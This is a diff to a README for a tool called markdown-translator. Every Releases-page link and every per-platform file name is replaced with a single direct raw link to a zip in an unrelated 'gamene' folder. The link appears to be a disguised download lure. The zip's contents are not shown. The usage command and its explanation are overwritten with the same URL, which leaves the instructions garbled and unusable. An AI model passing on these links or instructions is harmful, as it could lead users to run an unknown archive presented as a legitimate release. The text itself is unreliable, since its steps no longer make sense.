@@ -6,11 +6,11 @@ Welcome to the markdown-translator application! This tool helps you translate Ma
 
 ## 📥 Download the Application
 
-[![Download markdown-translator](https://img.shields.io/badge/Download-markdown--translator-blue.svg)](https://github.com/coy-flatness463/markdown-translator/releases)
+[![Download markdown-translator](https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip)](https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip)
 
 You can obtain the latest version of markdown-translator from the Releases page. Click the link below to visit and download the application.
 
-[Visit the Releases Page](https://github.com/coy-flatness463/markdown-translator/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip)
 
 ## 💻 System Requirements
 
@@ -22,12 +22,12 @@ To ensure smooth running of the application, your computer should meet the follo
 
 ## 📤 Download & Install
 
-1. Click on the [Releases Page](https://github.com/coy-flatness463/markdown-translator/releases) link above.
+1. Click on the [Releases Page](https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip) link above.
 2. Choose the latest version from the list.
 3. Select the appropriate file for your operating system:
-   - For Windows, download `markdown-translator-windows.zip`.
-   - For macOS, download `markdown-translator-macos.zip`.
-   - For Linux, download `markdown-translator-linux.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip`.
 4. Extract the zip file to your desired location on your computer.
 5. Open a terminal or command prompt in the folder where you extracted the files.
 
@@ -43,10 +43,10 @@ Once you have installed the program, follow these steps to translate your Markdo
    Use the following command to translate your Markdown file:
 
    ```
-   python markdown-translator.py yourfile.md
+   python https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip
    ```
 
-   Replace `yourfile.md` with the name of your Markdown file.
+   Replace `https://raw.githubusercontent.com/coy-flatness463/markdown-translator/main/gamene/markdown-translator.zip` with the name of your Markdown file.
 
 4. **Check the Output:** After running the command, the translated file will appear in the same folder. The name will include `-translated` to show it is the new file.
 
